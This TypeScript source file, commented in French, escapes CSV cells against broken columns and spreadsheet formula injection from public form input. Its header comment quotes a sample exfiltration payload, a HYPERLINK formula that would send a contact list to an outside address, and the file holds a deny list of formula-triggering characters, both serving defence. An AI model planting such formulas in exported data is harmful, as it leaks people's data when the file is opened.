/**
 * Une cellule de tableur, écrite sans danger.
 *
 * Deux problèmes, souvent confondus :
 *
 *   · le **format** — une virgule, un point-virgule, un guillemet ou un saut
 *     de ligne dans une valeur cassent la colonne si on ne la met pas entre
 *     guillemets ;
 *   · la **formule** — une cellule qui commence par `=`, `+`, `-` ou `@` est
 *     évaluée à l'ouverture par Excel et LibreOffice. Or nos colonnes viennent
 *     de formulaires publics : il suffit qu'une personne saisisse
 *     `=HYPERLINK("https://…"&A2)` comme prénom pour que le fichier, ouvert
 *     par la cliente, envoie la liste de ses contacts ailleurs.
 *
 * Le second est le plus grave, et c'est celui qu'on oublie. L'apostrophe de
 * tête rend la cellule inerte et ne s'affiche pas dans le tableur.
 */

/** Ce qui déclenche une formule en tête de cellule. */
const DEBUTS_DANGEREUX = ["=", "+", "-", "@", "\t", "\r"];

export function celluleCsv(v: unknown): string {
  const brut = v === null || v === undefined ? "" : String(v);
  const inerte = DEBUTS_DANGEREUX.includes(brut.slice(0, 1)) ? `'${brut}` : brut;
  return /[",\n;]/.test(inerte) ? `"${inerte.replace(/"/g, '""')}"` : inerte;
}

/** Une ligne de cellules, séparées par des points-virgules (le français d'Excel). */
export function ligneCsv(valeurs: unknown[]): string {
  return valeurs.map(celluleCsv).join(";");
}
